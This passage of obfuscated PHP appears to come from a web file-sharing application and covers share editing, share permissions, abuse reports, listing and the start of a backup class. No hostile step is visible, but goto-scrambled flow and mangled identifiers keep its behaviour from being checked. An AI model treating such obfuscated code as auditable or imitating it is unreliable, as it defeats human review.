$c¶ãòµóÙ˜[$aŒ®™¸ß[1436]] = $bÎ™•Ã·å²[$aŒ®™¸ß[28]]; } goto aì¯Á¢‹ç; B¥¬”·³‚õ: $c”ù×Á¡Õø = $this->add($FÒçîÅ»); $b»šˆãñ© = array($aŒ®™¸ß[464] => short_id($c”ù×Á¡Õø)); $this->where(array($aŒ®™¸ß[461] => $c”ù×Á¡Õø))->save($b»šˆãñ©); goto f‡…ƒŸ‘Û²; aì¯Á¢‹ç: $FÒçîÅ» = array($aŒ®™¸ß[1522] => USER_ID, $aŒ®™¸ß[404] => $f‡®á¼¥Ô¨, $aŒ®™¸ß[1436] => $aŒ®™¸ß[33], $aŒ®™¸ß[467] => 0, $aŒ®™¸ß[469] => 0, $aŒ®™¸ß[1076] => $aŒ®™¸ß[33], $aŒ®™¸ß[303] => $aŒ®™¸ß[33], $aŒ®™¸ß[855] => $aŒ®™¸ß[33], $aŒ®™¸ß[1842] => 0, $aŒ®™¸ß[1843] => 0, $aŒ®™¸ß[470] => 0, $aŒ®™¸ß[471] => $aŒ®™¸ß[33], $aŒ®™¸ß[464] => $aŒ®™¸ß[33]); $E´õĞ›âÁÅ = explode($aŒ®™¸ß[47], $aŒ®™¸ß[1844]); foreach ($E´õĞ›âÁÅ as $a°÷Ëß—ëî) { if (!isset($c¶ãòµóÙ˜[$a°÷Ëß—ëî])) { continue; } $FÒçîÅ»[$a°÷Ëß—ëî] = $c¶ãòµóÙ˜[$a°÷Ëß—ëî]; } goto B¥¬”·³‚õ; f‡…ƒŸ‘Û²: return $c”ù×Á¡Õø; goto a…öØôĞ¸®; a…öØôĞ¸®: } private function _shareAuthSet($aÈÎº‡áÖê, $aƒ­ğ›‡) { goto fîİïŒõæ; fóÀö²Ê: return $B§¼öˆáÆ©->addAll($bÔøÆƒ ¬, array(), !0); goto AÙÉ¥¯ã‚Õ; a·Ò‡êíø: $B§¼öˆáÆ©->where(array($FÑ§ñâã´[462] => $aÈÎº‡áÖê))->delete(); $bÔøÆƒ ¬ = array(); foreach ($aƒ­ğ›‡ as $c”Ÿˆ¨÷¤¢) { $a¹ó²œ¢è = SourceModel::TYPE_USER; if ($c”Ÿˆ¨÷¤¢[$FÑ§ñâã´[398]] == SourceModel::TYPE_GROUP) { $a¹ó²œ¢è = SourceModel::TYPE_GROUP; } $E±¯ÜŠËˆ² = array($FÑ§ñâã´[462] => $aÈÎº‡áÖê, $FÑ§ñâã´[398] => $a¹ó²œ¢è, $FÑ§ñâã´[478] => intval($c”Ÿˆ¨÷¤¢[$FÑ§ñâã´[478]]), $FÑ§ñâã´[1791] => 0, $FÑ§ñâã´[1845] => -1); if ($c”Ÿˆ¨÷¤¢[$FÑ§ñâã´[1791]]) { $E±¯ÜŠËˆ²[$FÑ§ñâã´[1791]] = $c”Ÿˆ¨÷¤¢[$FÑ§ñâã´[1791]]; } else { if ($c”Ÿˆ¨÷¤¢[$FÑ§ñâã´[1845]]) { $E±¯ÜŠËˆ²[$FÑ§ñâã´[1845]] = $c”Ÿˆ¨÷¤¢[$FÑ§ñâã´[1845]]; } } $bÔøÆƒ ¬[] = $E±¯ÜŠËˆ²; } goto fóÀö²Ê; fîİïŒõæ: $FÑ§ñâã´ =& $_SERVER[…ë˜õ]; if (!is_array($aƒ­ğ›‡)) { return !1; } $B§¼öˆáÆ© = Model($FÑ§ñâã´[1795]); goto a·Ò‡êíø; AÙÉ¥¯ã‚Õ: } public function numViewAdd($DãÄ»·³¨ª) { $bÒ‘Í•äÜà =& $_SERVER[…ë˜õ]; $A„ ¤›Ù« = array($bÒ‘Í•äÜà[461] => $DãÄ»·³¨ª); $this->where($A„ ¤›Ù«)->setAdd($bÒ‘Í•äÜà[1842]); } public function numDownloadAdd($bîÀëì·‡) { $FŠ‰³¸§ä· =& $_SERVER[…ë˜õ]; $aÑ·Ê¡îÛš = array($FŠ‰³¸§ä·[461] => $bîÀëì·‡); $this->where($aÑ·Ê¡îÛš)->setAdd($FŠ‰³¸§ä·[1843]); } protected function shareEdit($CˆÅˆœè•©, $cÕôŠ—¹¨•) { goto föŒ»Âì’; föŒ»Âì’: $A×áíö±·ò =& $_SERVER[…ë˜õ]; $f•Ÿàß¨„ = $this->getInfo($CˆÅˆœè•©); if (!$f•Ÿàß¨„) { return !1; } goto d¶×½Ÿè; d¶×½Ÿè: $this->_checkLinkShare($cÕôŠ—¹¨•, $f•Ÿàß¨„); $f‚•…‚ò‡ = array(); $BˆÈ—í…” = explode($A×áíö±·ò[47], $A×áíö±·ò[1846]); goto Cá¼›ÒÀó; A¥‚ç“±: if (isset($cÕôŠ—¹¨•[$A×áíö±·ò[1835]])) { $this->_shareAuthSet($CˆÅˆœè•©, $cÕôŠ—¹¨•[$A×áíö±·ò[1835]]); } return !0; goto c¸†£¬é«; Cá¼›ÒÀó: foreach ($BˆÈ—í…” as $AÕÚŸáÔ¸ä) { if (!array_key_exists($AÕÚŸáÔ¸ä, $cÕôŠ—¹¨•)) { continue; } $f‚•…‚ò‡[$AÕÚŸáÔ¸ä] = $cÕôŠ—¹¨•[$AÕÚŸáÔ¸ä]; } $this->shareEventAdd($f•Ÿàß¨„[$A×áíö±·ò[390]], $cÕôŠ—¹¨•, $A×áíö±·ò[1661]); $this->where(array($A×áíö±·ò[461] => $CˆÅˆœè•©))->save($f‚•…‚ò‡); goto A¥‚ç“±; c¸†£¬é«: } private function _checkLinkShare($Dø© ²“Ê–, $BŠƒÎÅÏˆÚ) { goto Aœµé¿ƒ¢; D×Ÿìø½À‰: $f³ğø¸ó¸Í = $this->shareFileMeta($A“‰Ï™ã¬[$dĞÛ‹õë‘Ş[441]]); if (isset($f³ğø¸ó¸Í[$dĞÛ‹õë‘Ş[370]]) && $f³ğø¸ó¸Í[$dĞÛ‹õë‘Ş[370]] == $dĞÛ‹õë‘Ş[86]) { show_json(LNG($dĞÛ‹õë‘Ş[1849]), !1); } goto B­´•¦•ç­; Aœµé¿ƒ¢: $dĞÛ‹õë‘Ş =& $_SERVER[…ë˜õ]; if ($Dø© ²“Ê–[$dĞÛ‹õë‘Ş[467]] != $dĞÛ‹õë‘Ş[86]) { return; } $E¹šÎ„Õ½ = $BŠƒÎÅÏˆÚ[$dĞÛ‹õë‘Ş[84]][$dĞÛ‹õë‘Ş[390]]; goto FõğìÈ”•§; FõğìÈ”•§: if ($BŠƒÎÅÏˆÚ[$dĞÛ‹õë‘Ş[84]][$dĞÛ‹õë‘Ş[29]] != $dĞÛ‹õë‘Ş[191]) { $cöîèëÔ = $this->_folderReport($E¹šÎ„Õ½); if (!$cöîèëÔ) { return; } show_json(LNG($dĞÛ‹õë‘Ş[1847]) . $dĞÛ‹õë‘Ş[1848] . $cöîèëÔ, !1); } $A“‰Ï™ã¬ = Model($dĞÛ‹õë‘Ş[796])->fileInfoGet($BŠƒÎÅÏˆÚ[$dĞÛ‹õë‘Ş[84]][$dĞÛ‹õë‘Ş[390]]); if (!$A“‰Ï™ã¬) { return; } goto D×Ÿìø½À‰; B­´•¦•ç­: } private function _folderReport($fµĞ—“Ôˆ×) { goto bæ¡áéÕ«; b¬‡àƒ½: $f“¥†´ŸÂè = substr($aãÀ®ëĞö[$e³º‹±¤½[481]], strpos($aãÀ®ëĞö[$e³º‹±¤½[481]], $A•ŠéÆ÷Ûù)); $fàíù¬ƒ÷¾ = array($e³º‹±¤½[390] => array($e³º‹±¤½[7], trim($f“¥†´ŸÂè, $e³º‹±¤½[47]))); $AÛ´Æ»«î« = Model($e³º‹±¤½[796])->where($fàíù¬ƒ÷¾)->field($e³º‹±¤½[28])->select(); goto f»—·ÆÁÎ; bæ¡áéÕ«: $e³º‹±¤½ =& $_SERVER[…ë˜õ]; $fàíù¬ƒ÷¾ = array($e³º‹±¤½[441] => array($e³º‹±¤½[975], 0), $e³º‹±¤½[731] => 3); $f‚£ìèñŠÄ = Model($e³º‹±¤½[1850])->where($fàíù¬ƒ÷¾)->field($e³º‹±¤½[441])->select(); goto DÑå˜îÂ¹Ñ; DŞ„Õ¼Ü’¸: $fàíù¬ƒ÷¾ = array($e³º‹±¤½[441] => array($e³º‹±¤½[7], $f‚£ìèñŠÄ), $e³º‹±¤½[481] => array($e³º‹±¤½[378], "\45{$A•ŠéÆ÷Ûù}\x25"), $e³º‹±¤½[417] => 0); $aãÀ®ëĞö = Model($e³º‹±¤½[796])->where($fàíù¬ƒ÷¾)->field($e³º‹±¤½[1851])->find(); if (!$aãÀ®ëĞö) { return !1; } goto b¬‡àƒ½; DÑå˜îÂ¹Ñ: if (!$f‚£ìèñŠÄ) { return !1; } $f‚£ìèñŠÄ = array_to_keyvalue($f‚£ìèñŠÄ, $e³º‹±¤½[33], $e³º‹±¤½[441]); $A•ŠéÆ÷Ûù = $e³º‹±¤½[47] . $fµĞ—“Ôˆ× . $e³º‹±¤½[47]; goto DŞ„Õ¼Ü’¸; f»—·ÆÁÎ: $dÃÉÈù·¶¹ = array_to_keyvalue($AÛ´Æ»«î«, $e³º‹±¤½[33], $e³º‹±¤½[28]); $dÃÉÈù·¶¹[] = $aãÀ®ëĞö[$e³º‹±¤½[28]]; return implode($e³º‹±¤½[8], $dÃÉÈù·¶¹); goto Bäá›ÏÉå¹; Bäá›ÏÉå¹: } protected function remove($bí¢˜àÇãÌ) { goto DéÇÎ‡µ§œ; DéÇÎ‡µ§œ: $Aæã²ŸŠ´ô =& $_SERVER[…ë˜õ]; if (is_array($bí¢˜àÇãÌ)) { $bí¢˜àÇãÌ = array($Aæã²ŸŠ´ô[7], $bí¢˜àÇãÌ); } $B¬ÛÙÆ ÏÏ = array($Aæã²ŸŠ´ô[462] => $bí¢˜àÇãÌ); goto eóˆ ¤è; eóˆ ¤è: $d‘¶ÇÜŠ„¡ = $this->where($B¬ÛÙÆ ÏÏ)->delete(); if ($d‘¶ÇÜŠ„¡) { Model($Aæã²ŸŠ´ô[559])->where(array($Aæã²ŸŠ´ô[462] => $bí¢˜àÇãÌ))->delete(); } $BÄÃá£¹¼ = is_array($bí¢˜àÇãÌ) ? $bí¢˜àÇãÌ[1] : array($bí¢˜àÇãÌ); goto Cñ‰«¨¨Ìò; Cñ‰«¨¨Ìò: for ($b‚ƒŞØ†Ó„ = 0; $b‚ƒŞØ†Ó„ < count($BÄÃá£¹¼); $b‚ƒŞØ†Ó„++) { $C‘ç¥Å¤£Š = $this->getInfo($BÄÃá£¹¼[$b‚ƒŞØ†Ó„]); if ($C‘ç¥Å¤£Š[$Aæã²ŸŠ´ô[469]] == $Aæã²ŸŠ´ô[86]) { Model($Aæã²ŸŠ´ô[528])->eventShare($C‘ç¥Å¤£Š[$Aæã²ŸŠ´ô[390]], $Aæã²ŸŠ´ô[1840]); } if ($C‘ç¥Å¤£Š[$Aæã²ŸŠ´ô[467]] == $Aæã²ŸŠ´ô[86]) { Model($Aæã²ŸŠ´ô[528])->eventShare($C‘ç¥Å¤£Š[$Aæã²ŸŠ´ô[390]], $Aæã²ŸŠ´ô[1839]); } } return $d‘¶ÇÜŠ„¡; goto cƒÌÆâ½; cƒÌÆâ½: } protected function removeBySource($Bìİó†œÊ) { goto F‚Í÷£ßÔ¿; Fª™Á Ëá: $Dë×öñë‚ = array_to_keyvalue($Dë×öñë‚, $FÈñöÏÅ[33], $FÈñöÏÅ[462]); if (!$Dë×öñë‚) { return; } $aç†·Ëƒ‚Ä = array($FÈñöÏÅ[461] => array($FÈñöÏÅ[405], $Dë×öñë‚)); goto fòÃ•ìµÉ; F‚Í÷£ßÔ¿: $FÈñöÏÅ =& $_SERVER[…ë˜õ]; $aç†·Ëƒ‚Ä = array($FÈñöÏÅ[404] => array($FÈñöÏÅ[405], $Bìİó†œÊ)); $Dë×öñë‚ = $this->field($FÈñöÏÅ[462])->where($aç†·Ëƒ‚Ä)->select(); goto Fª™Á Ëá; fòÃ•ìµÉ: $this->where($aç†·Ëƒ‚Ä)->delete(); Model($FÈñöÏÅ[559])->where($aç†·Ëƒ‚Ä)->delete(); goto d°‡˜ÊƒÎĞ; d°‡˜ÊƒÎĞ: } public function listAll($fÛİÏíĞ¦Ÿ) { goto eîãÙ‰½; eîãÙ‰½: $eœØæ“õÖË =& $_SERVER[…ë˜õ]; $FÖ“¸¡ÀÁí = array(); if ($fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[1531]]) { $FÖ“¸¡ÀÁí[$eœØæ“õÖË[1531]] = $fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[1531]]; } goto E›ÙÃµ¢ÃŞ; fÏ‘Ï¶òõó: $dÈùÔ›È‡Ï = $this->_makeOrder()->where($FÖ“¸¡ÀÁí)->selectPage(20); if (empty($dÈùÔ›È‡Ï[$eœØæ“õÖË[365]])) { return array(); } $this->_listDataApply($dÈùÔ›È‡Ï[$eœØæ“õÖË[365]]); goto fŠ¤×ÕÄÀÒ; fŠ¤×ÕÄÀÒ: return $dÈùÔ›È‡Ï; goto eöõë³½âŒ; E›ÙÃµ¢ÃŞ: if ($fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[744]]) { $B ÒóÂñ©Ä = $fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[470]] ? $fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[470]] : strtotime(date($eœØæ“õÖË[1852])); $FÖ“¸¡ÀÁí[$eœØæ“õÖË[192]] = array($eœØæ“õÖË[329], array($fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[744]], $B ÒóÂñ©Ä)); } if ($fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[29]]) { $FÖ“¸¡ÀÁí[$fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[29]]] = 1; } else { $FÖ“¸¡ÀÁí[] = array($eœØæ“õÖË[467] => array($eœØæ“õÖË[975], 0), $eœØæ“õÖË[469] => array($eœØæ“õÖË[975], 0), $eœØæ“õÖË[1829] => $eœØæ“õÖË[1783]); } if ($fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[1779]]) { $FÖ“¸¡ÀÁí[] = array($eœØæ“õÖË[464] => $fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[1779]], $eœØæ“õÖË[1436] => array($eœØæ“õÖË[378], "\45{$fÛİÏíĞ¦Ÿ[$eœØæ“õÖË[1779]]}\45"), $eœØæ“õÖË[1829] => $eœØæ“õÖË[1783]); } goto fÏ‘Ï¶òõó; eöõë³½âŒ: } public function listDataApply($BâÂ¹½âæç) { $this->_listDataApply($BâÂ¹½âæç); return $BâÂ¹½âæç; } private function _listDataApply(&$dÜ¶¯Ï«Û˜) { goto AÓÄò­ŒÁ; BÌœ°æ˜¢È: $C¼Ï”öÃ¸± = array_to_keyvalue($dÜ¶¯Ï«Û˜, $eéá–¹«‰õ[33], $eéá–¹«‰õ[390]); $fÏĞ¨™§­ = Model($eéá–¹«‰õ[796])->sourceListInfo($C¼Ï”öÃ¸±, !0); foreach ($dÜ¶¯Ï«Û˜ as $AÒ¾×¶Ş„Ã => &$CèâäÈìÑŠ) { $AŒµ“ ÊÉ = $CèâäÈìÑŠ[$eéá–¹«‰õ[1531]]; $CèâäÈìÑŠ[$eéá–¹«‰õ[1853]] = $dæİà¤¦Êæ[$AŒµ“ ÊÉ] ? $dæİà¤¦Êæ[$AŒµ“ ÊÉ] : !1; $d¨¹‡à¬Œ÷ = $CèâäÈìÑŠ[$eéá–¹«‰õ[390]]; $CèâäÈìÑŠ[$eéá–¹«‰õ[84]] = $fÏĞ¨™§­[$d¨¹‡à¬Œ÷] ? $fÏĞ¨™§­[$d¨¹‡à¬Œ÷] : !1; if (!$CèâäÈìÑŠ[$eéá–¹«‰õ[84]] || $CèâäÈìÑŠ[$eéá–¹«‰õ[84]][$eéá–¹«‰õ[417]] == $eéá–¹«‰õ[86]) { unset($dÜ¶¯Ï«Û˜[$AÒ¾×¶Ş„Ã]); } } goto D’¼Ç«É‚Æ; AÓÄò­ŒÁ: $eéá–¹«‰õ =& $_SERVER[…ë˜õ]; $fÓÌ™É‰Š = array_to_keyvalue($dÜ¶¯Ï«Û˜, $eéá–¹«‰õ[33], $eéá–¹«‰õ[1531]); $dæİà¤¦Êæ = Model($eéá–¹«‰õ[501])->userListInfo(array_unique($fÓÌ™É‰Š)); goto BÌœ°æ˜¢È; D’¼Ç«É‚Æ: unset($CèâäÈìÑŠ); $dÜ¶¯Ï«Û˜ = array_values($dÜ¶¯Ï«Û˜); goto e°¾†¢Ú¼…; e°¾†¢Ú¼…: } private function _makeOrder($FÍÈá­ğ = '') { goto e²‡’°îŞÇ; BçÒÓã‡‚Æ: $b­Ó¼™™ ¬ = Input::get($fò”©ÂÑ¼¤[429], $fò”©ÂÑ¼¤[7], $fò”©ÂÑ¼¤[410], $d¦‹¤Éœ¡ø); $A£¦ÁÍÚéğ = Input::get($fò”©ÂÑ¼¤[430], $fò”©ÂÑ¼¤[7], $fò”©ÂÑ¼¤[1854], array($fò”©ÂÑ¼¤[1778], $fò”©ÂÑ¼¤[424])); $A£¦ÁÍÚéğ = $Aç¬ÚµÅŞµ[$A£¦ÁÍÚéğ]; goto dìÀ‘»±ƒÇ; e²‡’°îŞÇ: $fò”©ÂÑ¼¤ =& $_SERVER[…ë˜õ]; $d¦‹¤Éœ¡ø = array($fò”©ÂÑ¼¤[192], $fò”©ÂÑ¼¤[470], $fò”©ÂÑ¼¤[1842], $fò”©ÂÑ¼¤[1843]); $Aç¬ÚµÅŞµ = array($fò”©ÂÑ¼¤[422] => $fò”©ÂÑ¼¤[423], $fò”©ÂÑ¼¤[424] => $fò”©ÂÑ¼¤[425]); goto BçÒÓã‡‚Æ; dìÀ‘»±ƒÇ: $FÍÈá­ğ = $FÍÈá­ğ . "{$b­Ó¼™™ ¬}\40{$A£¦ÁÍÚéğ}"; return $this->order($FÍÈá­ğ); goto Bµ¿øÃ‹âŒ; Bµ¿øÃ‹âŒ: } public function reportAdd($C¹æ™‰ß‚®) { $cİ¯çâÏÑÁ =& $_SERVER[…ë˜õ]; $CÜî™„Ğò = array($cİ¯çâÏÑÁ[462] => $C¹æ™‰ß‚®[$cİ¯çâÏÑÁ[462]], $cİ¯çâÏÑÁ[1531] => USER_ID); if (Model($cİ¯çâÏÑÁ[1850])->where($CÜî™„Ğò)->find()) { return !1; } $DÈ‹Š‹·° = array($cİ¯çâÏÑÁ[462] => $C¹æ™‰ß‚®[$cİ¯çâÏÑÁ[462]], $cİ¯çâÏÑÁ[1436] => $C¹æ™‰ß‚®[$cİ¯çâÏÑÁ[1436]], $cİ¯çâÏÑÁ[390] => $C¹æ™‰ß‚®[$cİ¯çâÏÑÁ[390]], $cİ¯çâÏÑÁ[441] => $C¹æ™‰ß‚®[$cİ¯çâÏÑÁ[441]], $cİ¯çâÏÑÁ[1531] => USER_ID, $cİ¯çâÏÑÁ[29] => $C¹æ™‰ß‚®[$cİ¯çâÏÑÁ[29]], $cİ¯çâÏÑÁ[425] => $C¹æ™‰ß‚®[$cİ¯çâÏÑÁ[425]]); return Model($cİ¯çâÏÑÁ[1850])->add($DÈ‹Š‹·°); } public function reportList($B¯È¹‘ùá) { goto f¡˜Â²î†; FÀå‡½îõ…: if (isset($B¯È¹‘ùá[$BÉ­†áÖ[29]]) && in_array($B¯È¹‘ùá[$BÉ­†áÖ[29]], array($BÉ­†áÖ[86], $BÉ­†áÖ[1855], $BÉ­†áÖ[1856], $BÉ­†áÖ[1857], $BÉ­†áÖ[1858]))) { $dÙ¥™¬µƒÔ[$BÉ­†áÖ[29]] = $B¯È¹‘ùá[$BÉ­†áÖ[29]]; } if (isset($B¯È¹‘ùá[$BÉ­†áÖ[731]]) && in_array($B¯È¹‘ùá[$BÉ­†áÖ[731]], array($BÉ­†áÖ[491], $BÉ­†áÖ[86], $BÉ­†áÖ[1855], $BÉ­†áÖ[1856]))) { $dÙ¥™¬µƒÔ[$BÉ­†áÖ[731]] = $B¯È¹‘ùá[$BÉ­†áÖ[731]]; } $fœ °¼•Ê = Input::get($BÉ­†áÖ[430], $BÉ­†áÖ[7], $BÉ­†áÖ[1854], array($BÉ­†áÖ[1778], $BÉ­†áÖ[424])); goto DÅ¡–åÃî; DÅ¡–åÃî: $b§®ÛÈ±å· = array($BÉ­†áÖ[422] => $BÉ­†áÖ[423], $BÉ­†áÖ[424] => $BÉ­†áÖ[425]); $B‘Œ¡¹÷óï = $BÉ­†áÖ[1859] . $b§®ÛÈ±å·[$fœ °¼•Ê]; $D‚©µÑéòù = Model($BÉ­†áÖ[1850])->where($dÙ¥™¬µƒÔ)->order($B‘Œ¡¹÷óï)->selectPage(20); goto aÚÚ×ŒÊ»é; aÚÚ×ŒÊ»é: if (empty($D‚©µÑéòù[$BÉ­†áÖ[365]])) { return array(); } $BğÈŸ³Ä† = array_to_keyvalue_group($D‚©µÑéòù[$BÉ­†áÖ[365]], $BÉ­†áÖ[731], $BÉ­†áÖ[462]); if (!empty($BğÈŸ³Ä†[0])) { $B¯È¹‘ùá = $BğÈŸ³Ä†[0]; $dÙ¥™¬µƒÔ = array($BÉ­†áÖ[462] => array($BÉ­†áÖ[7], $B¯È¹‘ùá)); $EŒªåÍ‚ˆ = $this->where($dÙ¥™¬µƒÔ)->field($BÉ­†áÖ[462])->select(); $EŒªåÍ‚ˆ = array_to_keyvalue($EŒªåÍ‚ˆ, $BÉ­†áÖ[33], $BÉ­†áÖ[462]); $c¬ğÆ‚¨Ú¾ = array_diff($B¯È¹‘ùá, $EŒªåÍ‚ˆ); if (!empty($c¬ğÆ‚¨Ú¾)) { foreach ($D‚©µÑéòù[$BÉ­†áÖ[365]] as $B²éÚ¸ÚÍ => $cŸ›ƒ‡‡‡í) { if (in_array($cŸ›ƒ‡‡‡í[$BÉ­†áÖ[462]], $c¬ğÆ‚¨Ú¾)) { unset($D‚©µÑéòù[$BÉ­†áÖ[365]][$B²éÚ¸ÚÍ]); } } } } goto eó‹£÷—Ú×; f¡˜Â²î†: $BÉ­†áÖ =& $_SERVER[…ë˜õ]; $dÙ¥™¬µƒÔ = array(); if ($B¯È¹‘ùá[$BÉ­†áÖ[744]]) { $Fµµ‡‰ÒŒƒ = $B¯È¹‘ùá[$BÉ­†áÖ[470]] ? $B¯È¹‘ùá[$BÉ­†áÖ[470]] : strtotime(date($BÉ­†áÖ[1852])); $dÙ¥™¬µƒÔ[$BÉ­†áÖ[192]] = array($BÉ­†áÖ[329], array($B¯È¹‘ùá[$BÉ­†áÖ[744]], $Fµµ‡‰ÒŒƒ)); } goto FÀå‡½îõ…; eó‹£÷—Ú×: $this->_listDataApply($D‚©µÑéòù[$BÉ­†áÖ[365]]); return $D‚©µÑéòù; goto b‘ËÔ“Æ™; b‘ËÔ“Æ™: } public function reportStatus($Eç±Ûäïƒİ) { goto a Âòİ†‡§; E™¦ó‹ƒ®Í: if (!$fçÃØÆ°‚š) { return !1; } $cĞóƒ‹ŒÕ× = array($fóÃéŠÕğ[731] => $Eç±Ûäïƒİ[$fóÃéŠÕğ[731]]); if ($Eç±Ûäïƒİ[$fóÃéŠÕğ[731]] == $fóÃéŠÕğ[1856] && $fçÃØÆ°‚š[$fóÃéŠÕğ[731]] == $fóÃéŠÕğ[1856]) { $cĞóƒ‹ŒÕ×[$fóÃéŠÕğ[731]] = 0; } goto E‡é‚²™Û; E‡é‚²™Û: $CæŸõ Äéí = Model($fóÃéŠÕğ[1850])->where($aöÀÈÉÆçè)->save($cĞóƒ‹ŒÕ×); if ($Eç±Ûäïƒİ[$fóÃéŠÕğ[731]] == $fóÃéŠÕğ[1855]) { if ($fçÃØÆ°‚š[$fóÃéŠÕğ[441]] != $fóÃéŠÕğ[491] && $this->shareFileMeta($fçÃØÆ°‚š[$fóÃéŠÕğ[441]])) { $this->shareFileMeta($fçÃØÆ°‚š[$fóÃéŠÕğ[441]], 0); } $this->remove($fçÃØÆ°‚š[$fóÃéŠÕğ[462]]); return !0; } if ($CæŸõ Äéí && $Eç±Ûäïƒİ[$fóÃéŠÕğ[731]] == $fóÃéŠÕğ[1856]) { $c³ØÎŠ²ö‚ = $cĞóƒ‹ŒÕ×[$fóÃéŠÕğ[731]] == $fóÃéŠÕğ[1856] ? 1 : 0; $this->shareFileMeta($fçÃØÆ°‚š[$fóÃéŠÕğ[441]], $c³ØÎŠ²ö‚); $this->removeByFile($fçÃØÆ°‚š[$fóÃéŠÕğ[441]]); } goto bïÑ¸æĞéä; a Âòİ†‡§: $fóÃéŠÕğ =& $_SERVER[…ë˜õ]; $aöÀÈÉÆçè = array($fóÃéŠÕğ[388] => $Eç±Ûäïƒİ[$fóÃéŠÕğ[388]]); $fçÃØÆ°‚š = Model($fóÃéŠÕğ[1850])->where($aöÀÈÉÆçè)->field($fóÃéŠÕğ[1860])->find(); goto E™¦ó‹ƒ®Í; bïÑ¸æĞéä: return $CæŸõ Äéí; goto c˜§¡Ó»å†; c˜§¡Ó»å†: } private function removeByFile($då†ÏŸˆŸ×) { goto c‘¹Â³¿—; AËŸ ›ÀŒ: $FÎ†ŒÛÆ¢Ì = array($dÓê«¼™¿[390] => array($dÓê«¼™¿[7], $cÜİÊÚ¨Ã), $dÓê«¼™¿[467] => 1); $A“ÚÀÃ«Å¼ = $this->where($FÎ†ŒÛÆ¢Ì)->field($dÓê«¼™¿[462])->select(); if (empty($A“ÚÀÃ«Å¼)) { return; } goto EíÁŸÁÃ³â; c‘¹Â³¿—: $dÓê«¼™¿ =& $_SERVER[…ë˜õ]; $A“ÚÀÃ«Å¼ = Model($dÓê«¼™¿[796])->where(array($dÓê«¼™¿[441] => $då†ÏŸˆŸ×))->field($dÓê«¼™¿[390])->select(); $cÜİÊÚ¨Ã = array_to_keyvalue($A“ÚÀÃ«Å¼, $dÓê«¼™¿[33], $dÓê«¼™¿[390]); goto AËŸ ›ÀŒ; EíÁŸÁÃ³â: $Bîœà¡’ÎÌ = array_to_keyvalue($A“ÚÀÃ«Å¼, $dÓê«¼™¿[33], $dÓê«¼™¿[462]); $this->remove($Bîœà¡’ÎÌ); goto AË ‚Ñ…–Ç; AË ‚Ñ…–Ç: } private function shareFileMeta($Bµ›†‹Ëãã, $EŞ™¦èãÅê = null) { $Bé¶›Ó÷²ğ =& $_SERVER[…ë˜õ]; $dùÅ»óÔŞµ = array($Bé¶›Ó÷²ğ[441] => $Bµ›†‹Ëãã, $Bé¶›Ó÷²ğ[92] => $Bé¶›Ó÷²ğ[1861]); if (is_null($EŞ™¦èãÅê)) { return Model($Bé¶›Ó÷²ğ[1862])->where($dùÅ»óÔŞµ)->find(); } $dùÅ»óÔŞµ[$Bé¶›Ó÷²ğ[370]] = $EŞ™¦èãÅê; Model($Bé¶›Ó÷²ğ[1862])->add($dùÅ»óÔŞµ, array(), !0); } } goto C½ÄËêíƒ; dÊŒäö˜ä„: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $D˜Ó¾´Ú =& $_SERVER[…ë˜õ]; self::$name = date($D˜Ó¾´Ú[729]); if (!($A†ßêË­ÖÏ = Model($D˜Ó¾´Ú[730])->lastItem())) { $A†ßêË­ÖÏ = $this->initData(); } else { self::$name = $A†ßêË­ÖÏ[$D˜Ó¾´Ú[28]]; if ($A†ßêË­ÖÏ[$D˜Ó¾´Ú[731]] == $D˜Ó¾´Ú[86]) { self::$name = date($D˜Ó¾´Ú[732]); $dçäáÓ„ÂŞ = 0; if (isset($A†ßêË­ÖÏ[$D˜Ó¾´Ú[289]][$D˜Ó¾´Ú[191]][$D˜Ó¾´Ú[441]])) { $dçäáÓ„ÂŞ = (int) $A†ßêË­ÖÏ[$D˜Ó¾´Ú[289]][$D˜Ó¾´Ú[191]][$D˜Ó¾´Ú[441]]; } if ($A†ßêË­ÖÏ[$D˜Ó¾´Ú[28]] == self::$name) { Model($D˜Ó¾´Ú[730])->remove($A†ßêË­ÖÏ[$D˜Ó¾´Ú[388]]); } $A†ßêË­ÖÏ = $this->initData($dçäáÓ„ÂŞ, $A†ßêË­ÖÏ[$D˜Ó¾´Ú[733]]); } else { $this->checkStore($A†ßêË­ÖÏ[$D˜Ó¾´Ú[733]]); } } self::$option = $A†ßêË­ÖÏ; } private function initData($DíÂ—„âÃÑ = 0, $f¥´¶°ÚŠœ = '') { goto Eä»Ç¼óÂ; e¾ ‰ÏàÉø: $eÁ§‚Û†ã[$f¨Äí»˜ƒ´[388]] = $DŒÄ™§³‚; return $eÁ§‚Û†ã; goto bêÎ‚¨ßˆÆ; Eä»Ç¼óÂ: $f¨Äí»˜ƒ´ =& $_SERVER[…ë˜õ]; $aµŒ™ô³´® = Model($f¨Äí»˜ƒ´[730])->config(); if ($f¥´¶°ÚŠœ && $aµŒ™ô³´®[$f¨Äí»˜ƒ´[733]] != $f¥´¶°ÚŠœ) { $DíÂ—„âÃÑ = 0; } goto CÆğ÷‚Ï‘ğ; CÆğ÷‚Ï‘ğ: $this->checkStore($aµŒ™ô³´®[$f¨Äí»˜ƒ´[733]]); $eÁ§‚Û†ã = array($f¨Äí»˜ƒ´[733] => $aµŒ™ô³´®[$f¨Äí»˜ƒ´[733]], $f¨Äí»˜ƒ´[28] => self::$name, $f¨Äí»˜ƒ´[731] => 0, $f¨Äí»˜ƒ´[734] => $aµŒ™ô³´®[$f¨Äí»˜ƒ´[734]], $f¨Äí»˜ƒ´[289] => array($f¨Äí»˜ƒ´[735] => array($f¨Äí»˜ƒ´[731] => 0), $f¨Äí»˜ƒ´[736] => array($f¨Äí»˜ƒ´[731] => 0, $f¨Äí»˜ƒ´[737] => 0, $f¨Äí»˜ƒ´[738] => 0, $f¨Äí»˜ƒ´[29] => $f¨Äí»˜ƒ´[33]), $f¨Äí»˜ƒ´[739] => array($f¨Äí»˜ƒ´[731] => 0, $f¨Äí»˜ƒ´[737] => 0, $f¨Äí»˜ƒ´[738] => 0), 